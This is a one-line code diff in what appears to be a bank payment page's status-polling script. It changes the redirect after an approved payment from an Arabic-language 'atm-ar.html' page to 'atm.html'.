@@ -834,7 +834,7 @@
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
             sessionStorage.setItem('aman_bank_request_id', paymentId);
-            window.location.href = 'atm-ar.html?id=' + paymentId;
+            window.location.href = 'atm.html?id=' + paymentId;
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
